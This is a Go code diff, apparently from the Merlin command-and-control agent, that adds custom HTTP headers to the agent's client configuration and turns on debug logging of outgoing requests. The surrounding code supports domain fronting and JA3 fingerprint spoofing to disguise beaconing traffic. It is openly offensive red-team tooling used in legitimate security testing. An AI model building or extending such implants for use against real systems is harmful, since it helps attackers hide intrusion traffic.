@@ -75,6 +75,7 @@ type Config struct {
 	AgentID     uuid.UUID // The Agent's UUID
 	Protocol    string    // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
 	Host        string    // Host is used with the HTTP Host header for Domain Fronting activities
+	Headers     string    // Headers is a new-line separated string of additional HTTP headers to add to client requests
 	URL         []string  // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
 	Proxy       string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
 	UserAgent   string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
@@ -117,6 +118,27 @@ func New(config Config) (*Client, error) {
 		client.PaddingMax = 0
 	}
 
+	// Parse additional HTTP Headers
+	if config.Headers != "" {
+		client.Headers = make(map[string]string)
+		for _, header := range strings.Split(config.Headers, "\\n") {
+			h := strings.Split(header, ":")
+			// Remove leading or trailing spaces
+			headerKey := strings.TrimSuffix(strings.TrimPrefix(h[0], " "), " ")
+			headerValue := strings.TrimSuffix(strings.TrimPrefix(h[1], " "), " ")
+			cli.Message(
+				cli.DEBUG,
+				fmt.Sprintf("HTTP Header (%d): %s, Value (%d): %s\n",
+					len(headerKey),
+					headerKey,
+					len(headerValue),
+					headerValue,
+				),
+			)
+			client.Headers[headerKey] = headerValue
+		}
+	}
+
 	// Get the HTTP client
 	client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3)
 	if err != nil {
@@ -128,6 +150,7 @@ func New(config Config) (*Client, error) {
 	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %v", client.URL))
 	cli.Message(cli.INFO, fmt.Sprintf("\tUser-Agent: %s", client.UserAgent))
 	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Host Header: %s", client.Host))
+	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Headers: %s", client.Headers))
 	cli.Message(cli.INFO, fmt.Sprintf("\tProxy: %s", client.Proxy))
 	cli.Message(cli.INFO, fmt.Sprintf("\tPayload Padding Max: %d", client.PaddingMax))
 	cli.Message(cli.INFO, fmt.Sprintf("\tJA3 String: %s", client.JA3))
@@ -340,7 +363,7 @@ func (client *Client) SendMerlinMessage(m messages.Base) (messages.Base, error) 
 
 	// Send the request
 	cli.Message(cli.DEBUG, fmt.Sprintf("Sending POST request size: %d to: %s", req.ContentLength, client.URL))
-	//cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request:\r\n%+v", req))
+	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request:\r\n%+v", req))
 	resp, err := client.Client.Do(req)
 
 	if err != nil {
